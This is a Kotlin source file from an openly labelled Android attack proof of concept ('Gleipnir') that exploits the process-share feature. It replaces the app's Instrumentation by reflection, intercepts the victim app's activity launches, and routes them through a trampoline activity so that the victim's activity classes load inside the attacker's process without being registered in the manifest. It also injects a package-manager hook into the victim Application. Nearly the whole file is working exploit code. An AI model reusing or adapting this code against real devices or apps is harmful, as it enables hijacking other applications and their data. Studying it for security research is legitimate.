/*
 * Gleipnir Attack POC - Exploiting the Android process share feature
 * Copyright (C) <2020>  <Sascha Roth>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package org.gleipnir.app.extendableLoader.internal

import android.app.Activity
import android.app.Application
import android.app.Instrumentation
import android.content.Context
import android.content.Intent
import android.content.pm.ActivityInfo
import android.content.pm.PackageInfo
import android.os.BaseBundle
import android.os.Bundle
import android.os.IBinder
import android.os.PersistableBundle
import org.gleipnir.app.Trampoline
import org.gleipnir.app.extendableLoader.log
import org.gleipnir.app.helpers.PackageManagerHelper
import org.gleipnir.app.reflectionHelper.getDeclaredField
import org.gleipnir.app.reflectionHelper.getReflective
import org.gleipnir.app.reflectionHelper.setReflective
import java.lang.reflect.Field

/**
 * Observes the Activity lifecycle (mostly the start procedure)
 *
 * Also we catch all requests for Activity launch.
 * If the Activity to be launched belongs to the victim App, we launch the Trampoline instead using
 * the original intent as bundle extra. Once we got the startActivity(...) request of Android
 * we obtain the original intent and load and start the victim Activity's class (see newActivity(...)).
 *
 * Also see: doc/activity_launch_bypass.png
 */
class ActivityObserver(
    val packageInfo: PackageInfo,
    val callback: ActivityObserverCallback
) : Instrumentation() {

    override fun callActivityOnPause(activity: Activity?) {
        super.callActivityOnPause(activity)
    }

    override fun newApplication(
        cl: ClassLoader?,
        className: String?,
        context: Context?
    ): Application {
        val application = super.newApplication(cl, className, context)
        PackageManagerHelper.inject(application, packageInfo)
        return application;
    }

    override fun newActivity(
        clazz: Class<*>?,
        context: Context?,
        token: IBinder?,
        application: Application?,
        intent: Intent?,
        info: ActivityInfo?,
        title: CharSequence?,
        parent: Activity?,
        id: String?,
        lastNonConfigurationInstance: Any?
    ): Activity {
        log("ActivityObserver [-] newActivity1 called")
        lateinit var contextToReturn: Context
        // trigger callback
        val activity = super.newActivity(
            clazz,
            contextToReturn,
            token,
            application,
            intent,
            info,
            title,
            parent,
            id,
            lastNonConfigurationInstance
        )
        callback.onNewActivity(activity)
        return activity
    }

    override fun newActivity(cl: ClassLoader?, className: String?, intent: Intent?): Activity {
        log(
            "ActivityObserver [-] newActivity2 called $className"
        )
        lateinit var activity: Activity
        intent?.let {
            /**
             * PART 2 of our activity hack.
             *
             * We extract the original intent and let instrumentation instanciate the activity we want
             */
            val originalIntent = intent.getParcelableExtra<Intent>(ORIGINAL_INTENT_EXTRA)
            originalIntent?.let {
                log(
                    "ActivityObserver [-] newActivity2 called forward original class${originalIntent.component}"
                )
                activity =
                    super.newActivity(cl, originalIntent.component!!.className, originalIntent)

            } ?: kotlin.run {
                activity = super.newActivity(cl, className, intent)
            }

        } ?: kotlin.run {
            activity = super.newActivity(cl, className, intent)
        }
        // trigger callback
        callback.onNewActivity(activity)
        return activity;
    }


    override fun callActivityOnPostCreate(activity: Activity, savedInstanceState: Bundle?) {
        try {
            super.callActivityOnPostCreate(activity, savedInstanceState)
        } catch (exception: Exception) {
            log("callActivityOnPostCreate [-] exception: ", exception)
        }
    }

    override fun callActivityOnPostCreate(
        activity: Activity,
        savedInstanceState: Bundle?,
        persistentState: PersistableBundle?
    ) {
        try {
            super.callActivityOnPostCreate(activity, savedInstanceState, persistentState)
        } catch (exception: Exception) {
            log("callActivityOnPostCreate [-] exception: ", exception)
        }
    }

    override fun callActivityOnResume(activity: Activity?) {
        try {
            super.callActivityOnResume(activity)
        } catch (exception: java.lang.Exception) {
            log("callActivityOnResume [-] exception: ", exception)
        }
    }

    override fun callActivityOnCreate(activity: Activity?, icicle: Bundle?) {
        log("ActivityObserver [-] MyInstrumentation [-] callActivityOnCreate")
        // trigger callback
        activity?.let {
            injectIntent(activity)
            callback.onPreActivityOnCreate(activity)
        }
        super.callActivityOnCreate(activity, icicle)
        activity?.let { callback.onPostActivityOnCreate(activity) }
    }

    override fun callActivityOnCreate(
        activity: Activity?,
        icicle: Bundle?,
        persistentState: PersistableBundle?
    ) {
        log("ActivityObserver [-] MyInstrumentation [-] callActivityOnCreate")
        // trigger callback
        activity?.let {
            injectIntent(activity)
            callback.onPreActivityOnCreate(activity)
        }
        super.callActivityOnCreate(activity, icicle, persistentState)
        activity?.let { callback.onPostActivityOnCreate(activity) }
    }

    companion object {
        const val ORIGINAL_INTENT_EXTRA = "ORIGINAL_INTENT_EXTRA"
        //val trampolineActivityClass = Trampoline::class.java
        /**
         * Create a new Instrumentation instance, based on the given existing instrumentation instance
         *
         */
        @JvmStatic
        fun copyFromInstrumentation(
            instrumentation: Instrumentation,
            hostActivity: Activity,
            packageInfo: PackageInfo,
            activityThread: Any,
            callback: ActivityObserverCallback
        ): ActivityObserver {
            val myInstrumentation = ActivityObserver(packageInfo, callback)
            Instrumentation::class.java.declaredFields.forEach {
                it.isAccessible = true
                it.set(myInstrumentation, it.get(instrumentation))
            }
            setReflective(myInstrumentation, Instrumentation::class.java, "mThread", activityThread)
            setReflective(
                myInstrumentation,
                Instrumentation::class.java,
                "mAppContext",
                hostActivity
            )
            myInstrumentation.addMonitor(object : Instrumentation.ActivityMonitor() {
                override fun onStartActivity(intent: Intent?): ActivityResult? {
                    /**
                     * PART1 of the Activity hack.
                     *
                     * In general we don't want to register all activities in the manifest.
                     * In order to achieve that, we have to trick the ActivivityManagerService and the victim Application.
                     *
                     * All startActivtiy(..) calls from victim's code will be catched within this callback of Instrumentation.
                     * We wrap the intent used for the startActivity(...) call and put it as extra into a new intent.
                     * This new intent has Gleipnit's Hacktivity as target. ActivityManagerThread will accept this call because
                     * Hacktivity is a valid Activity of Gleipnir. in the 2nd part of this bypass, we extract the intent again and
                     * load the victim's activity class. (see newActivity)
                     */
                    log(
                        "ActivityObserver [-] going to launch intent ${intent?.component}"
                    )
                    callback.onStartActivity(intent)
                    val trampolineActivity = Trampoline.currentTrampoline
                        ?: throw java.lang.Exception("Trampoline class is null, this should never happen!! Please ensure a trampoline was created")

                    val trampolineActivityClass = trampolineActivity::class.java

                    if (intent?.component != null && intent?.component?.className != trampolineActivityClass.name) {
                        log(
                            "ActivityObserver [-] apply Hacktivity workaround "
                        )
                        val launchIntent = Intent(hostActivity, trampolineActivityClass)
                        launchIntent.putExtra(ORIGINAL_INTENT_EXTRA, intent) // store the original intent
                        hostActivity.startActivity(launchIntent)
                        return ActivityResult(0, Intent())
                    } else {
                        log(
                            "ActivityObserver [-] forward Gleipnir's Hacktivity <${intent?.component}>"
                        )
                        return null
                    }
                }
            })
            return myInstrumentation
        }

        /**
         * Inject the original intent that was used initially. (Android will insert the intent of our Trampoline)
         *
         * The original intent is stored inside the trampoline start intent.
         */
        fun injectIntent(activity: Activity) {
            log("ActivityObserver [-] injectIntent")
            val originalIntent = activity.intent.getParcelableExtra<Intent>(ORIGINAL_INTENT_EXTRA)
            originalIntent?.let {
                log("ActivityObserver [-] replace intent")
                activity.intent = originalIntent
            }
            activity.intent?.extras?.let {
                log("ActivityObserver [-] inject classloader")
                val extras = getReflective<Bundle>(activity.intent, "mExtras")
                setReflective(
                    extras,
                    BaseBundle::class.java,
                    "mClassLoader",
                    activity::class.java.classLoader
                )
            }
        }
    }
}

/**
 * Track the activity lifecycle of all future Activities.
 *
 * @param hostActivity Host Activity of Gleipnir
 * @param packageInfo The PackageInfo of the target App
 * @param callback The callback of the Activity lifecycle
 */
fun observeActivities(
    hostActivity: Activity,
    packageInfo: PackageInfo,
    callback: ActivityObserverCallback
    // But while calling recreate, the activity seems to fetch new resources instances:(
) { // todo fetch via package manager...


    // activity listener
    // fetch activity thread
    val mMainThreadField = Activity::class.java.getDeclaredField("mMainThread")
    mMainThreadField.isAccessible = true
    val activityThread = mMainThreadField.get(hostActivity)
    // fetch instrumentation
    val instrumentationField =
        activityThread::class.java.getDeclaredField("mInstrumentation")
    instrumentationField.isAccessible = true
    val instrumentation = instrumentationField.get(activityThread) as Instrumentation
    val myInstrumentation = ActivityObserver.copyFromInstrumentation(
        instrumentation,
        hostActivity,
        packageInfo,
        activityThread,
        callback
    )
    instrumentationField.set(
        activityThread,
        myInstrumentation
    )
    val activityInstrumentationField =
        getDeclaredField(Activity::class.java, "mInstrumentation") as Field
    activityInstrumentationField.isAccessible = true
    activityInstrumentationField.set(hostActivity, myInstrumentation)
}

interface ActivityObserverCallback {
    /**
     * Called when a new activity shall be launched.
     */
    fun onStartActivity(intent: Intent?)

    /**
     * Launched when a new activity was instantiated.
     * onAttach and onCreate was NOT called.
     *
     * @param newActivity the new activity that was instantiated
     */
    fun onNewActivity(activity: Activity)

    /**
     * Called just before the onCreate call.
     *
     * @param activity the activity the onCreate call will happen
     */
    fun onPreActivityOnCreate(activity: Activity?)

    /**
     * Called once the activity onCreate was called
     *
     * @param activity the activity onCreate was called
     */
    fun onPostActivityOnCreate(activity: Activity)
}

